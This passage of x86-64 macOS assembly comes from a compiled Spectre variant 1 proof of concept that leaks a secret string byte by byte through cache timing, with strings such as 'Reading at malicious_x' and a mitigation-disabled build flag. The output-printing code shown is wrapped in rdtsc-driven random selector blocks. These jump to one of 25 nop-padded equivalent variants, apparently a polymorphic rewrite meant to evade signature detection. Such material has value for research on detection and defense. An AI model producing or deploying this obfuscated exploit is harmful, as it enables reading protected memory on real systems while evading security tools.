	jmp	.Lmain_win2_continue
## Variant 23
.Lmain_win2_var23:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
## Variant 24
.Lmain_win2_var24:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-54(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win2_continue
.Lmain_win2_continue:
	movl	%eax, -68(%rbp)    # # 4-byte Spill
	jmp	LBB2_14
LBB2_13:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	$63, %eax
	movl	%eax, -68(%rbp)    # # 4-byte Spill
	jmp	LBB2_14
LBB2_14:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	-64(%rbp), %esi    # # 4-byte Reload
	movl	-68(%rbp), %edx    # # 4-byte Reload
	movl	-16(%rbp), %ecx
	leaq	L_.str.16(%rip), %rdi
	movb	$0, %al
	callq	_printf
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win1_var0
	cmpl	$1, %eax
	je	.Lmain_win1_var1
	cmpl	$2, %eax
	je	.Lmain_win1_var2
	cmpl	$3, %eax
	je	.Lmain_win1_var3
	cmpl	$4, %eax
	je	.Lmain_win1_var4
	cmpl	$5, %eax
	je	.Lmain_win1_var5
	cmpl	$6, %eax
	je	.Lmain_win1_var6
	cmpl	$7, %eax
	je	.Lmain_win1_var7
	cmpl	$8, %eax
	je	.Lmain_win1_var8
	cmpl	$9, %eax
	je	.Lmain_win1_var9
	cmpl	$10, %eax
	je	.Lmain_win1_var10
	cmpl	$11, %eax
	je	.Lmain_win1_var11
	cmpl	$12, %eax
	je	.Lmain_win1_var12
	cmpl	$13, %eax
	je	.Lmain_win1_var13
	cmpl	$14, %eax
	je	.Lmain_win1_var14
	cmpl	$15, %eax
	je	.Lmain_win1_var15
	cmpl	$16, %eax
	je	.Lmain_win1_var16
	cmpl	$17, %eax
	je	.Lmain_win1_var17
	cmpl	$18, %eax
	je	.Lmain_win1_var18
	cmpl	$19, %eax
	je	.Lmain_win1_var19
	cmpl	$20, %eax
	je	.Lmain_win1_var20
	cmpl	$21, %eax
	je	.Lmain_win1_var21
	cmpl	$22, %eax
	je	.Lmain_win1_var22
	cmpl	$23, %eax
	je	.Lmain_win1_var23
	cmpl	$24, %eax
	je	.Lmain_win1_var24
	jmp	.Lmain_win1_var0
## Variant 0
.Lmain_win1_var0:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 1
.Lmain_win1_var1:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 2
.Lmain_win1_var2:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 3
.Lmain_win1_var3:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 4
.Lmain_win1_var4:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 5
.Lmain_win1_var5:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 6
.Lmain_win1_var6:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 7
.Lmain_win1_var7:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 8
.Lmain_win1_var8:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 9
.Lmain_win1_var9:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 10
.Lmain_win1_var10:
	popq	%rax
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 11
.Lmain_win1_var11:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	nop
	jmp	.Lmain_win1_continue
## Variant 12
.Lmain_win1_var12:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 13
.Lmain_win1_var13:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	nop
	nop
	movzbl	(%r10), %eax
	nop
	nop
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 14
.Lmain_win1_var14:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 15
.Lmain_win1_var15:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 16
.Lmain_win1_var16:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 17
.Lmain_win1_var17:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	nop
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 18
.Lmain_win1_var18:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	nop
	jle	LBB2_20
	nop
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	nop
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 19
.Lmain_win1_var19:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 20
.Lmain_win1_var20:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 21
.Lmain_win1_var21:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 22
.Lmain_win1_var22:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
## Variant 23
.Lmain_win1_var23:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win1_continue
## Variant 24
.Lmain_win1_var24:
	popq	%rax
	nop
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win1_continue
.Lmain_win1_continue:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win0_var0
	cmpl	$1, %eax
	je	.Lmain_win0_var1
	cmpl	$2, %eax
	je	.Lmain_win0_var2
	cmpl	$3, %eax
	je	.Lmain_win0_var3
	cmpl	$4, %eax
	je	.Lmain_win0_var4
	cmpl	$5, %eax
	je	.Lmain_win0_var5
	cmpl	$6, %eax
	je	.Lmain_win0_var6
	cmpl	$7, %eax
	je	.Lmain_win0_var7
	cmpl	$8, %eax
	je	.Lmain_win0_var8
	cmpl	$9, %eax
	je	.Lmain_win0_var9
	cmpl	$10, %eax
	je	.Lmain_win0_var10
	cmpl	$11, %eax
	je	.Lmain_win0_var11
	cmpl	$12, %eax
	je	.Lmain_win0_var12
	cmpl	$13, %eax
	je	.Lmain_win0_var13
	cmpl	$14, %eax
	je	.Lmain_win0_var14
	cmpl	$15, %eax
	je	.Lmain_win0_var15
	cmpl	$16, %eax
	je	.Lmain_win0_var16
	cmpl	$17, %eax
	je	.Lmain_win0_var17
	cmpl	$18, %eax
	je	.Lmain_win0_var18
	cmpl	$19, %eax
	je	.Lmain_win0_var19
	cmpl	$20, %eax
	je	.Lmain_win0_var20
	cmpl	$21, %eax
	je	.Lmain_win0_var21
	cmpl	$22, %eax
	je	.Lmain_win0_var22
	cmpl	$23, %eax
	je	.Lmain_win0_var23
	cmpl	$24, %eax
	je	.Lmain_win0_var24
	jmp	.Lmain_win0_var0
## Variant 0
.Lmain_win0_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 1
.Lmain_win0_var1:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 2
.Lmain_win0_var2:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 3
.Lmain_win0_var3:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 4
.Lmain_win0_var4:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 5
.Lmain_win0_var5:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 6
.Lmain_win0_var6:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 7
.Lmain_win0_var7:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 8
.Lmain_win0_var8:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 9
.Lmain_win0_var9:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 10
.Lmain_win0_var10:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 11
.Lmain_win0_var11:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 12
.Lmain_win0_var12:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 13
.Lmain_win0_var13:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 14
.Lmain_win0_var14:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 15
.Lmain_win0_var15:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 16
.Lmain_win0_var16:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 17
.Lmain_win0_var17:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 18
.Lmain_win0_var18:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 19
.Lmain_win0_var19:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 20
.Lmain_win0_var20:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	nop
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 21
.Lmain_win0_var21:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 22
.Lmain_win0_var22:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
## Variant 23
.Lmain_win0_var23:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 24
.Lmain_win0_var24:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	nop
	movzbl	(%r10), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	leaq	-53(%rbp), %r10
	movzbl	(%r10), %eax
	jmp	.Lmain_win0_continue
.Lmain_win0_continue:
	movl	%eax, -76(%rbp)    # # 4-byte Spill
	jmp	LBB2_19
LBB2_18:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	$63, %eax
	movl	%eax, -76(%rbp)    # # 4-byte Spill
	jmp	LBB2_19
LBB2_19:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	-72(%rbp), %esi    # # 4-byte Reload
	movl	-76(%rbp), %edx    # # 4-byte Reload
	movl	-12(%rbp), %ecx
	leaq	L_.str.17(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB2_20:                                ##   in Loop: Header=BB2_9 Depth=1
	leaq	L_.str.10(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB2_9
LBB2_21:
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB2_23
## %bb.22:
	xorl	%eax, %eax
	addq	$80, %rsp
	popq	%rbp
	retq
LBB2_23:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_array1_size                    ## @array1_size
	.p2align	2, 0x0
_array1_size:
	.long	16                              ## 0x10
	.globl	_array1                         ## @array1
	.p2align	4, 0x0
_array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.section	__TEXT,__cstring,cstring_literals
	L_.str	:    # # @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.globl	_temp                           ## @temp
.zerofill __DATA,__common,_temp,1,0
	.comm	_array2,131072,4                ## @array2
.zerofill __DATA,__bss,_readMemoryByte.results,1024,4 ## @readMemoryByte.results
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%d"
	L_.str.2	:    # # @.str.2
	.asciz	"%p"
	L_.str.3	:    # # @.str.3
	.asciz	"Using a cache hit threshold of %d.\n"
	L_.str.4	:    # # @.str.4
	.asciz	"Build: "
	L_.str.5	:    # # @.str.5
	.asciz	"RDTSCP_SUPPORTED "
	L_.str.6	:    # # @.str.6
	.asciz	"MFENCE_SUPPORTED "
	L_.str.7	:    # # @.str.7
	.asciz	"CLFLUSH_SUPPORTED "
	L_.str.8	:    # # @.str.8
	.asciz	"INTEL_MITIGATION_DISABLED "
	L_.str.9	:    # # @.str.9
	.asciz	"LINUX_KERNEL_MITIGATION_DISABLED "
	L_.str.10	:    # # @.str.10
	.asciz	"\n"
	L_.str.11	:    # # @.str.11
	.asciz	"Reading %d bytes:\n"
	L_.str.12	:    # # @.str.12
	.asciz	"Reading at malicious_x = %p... "
	L_.str.13	:    # # @.str.13
	.asciz	"%s: "
	L_.str.14	:    # # @.str.14
	.asciz	"Success"
	L_.str.15	:    # # @.str.15
	.asciz	"Unclear"
	L_.str.16	:    # # @.str.16
	.asciz	"0x%02X=\342\200\231%c\342\200\231 score=%d "
	L_.str.17	:    # # @.str.17
	.asciz	"(second best: 0x%02X=\342\200\231%c\342\200\231 score=%d)"
	.comm	_unused1,64,4                   ## @unused1
	.comm	_unused2,64,4                   ## @unused2
.subsections_via_symbols
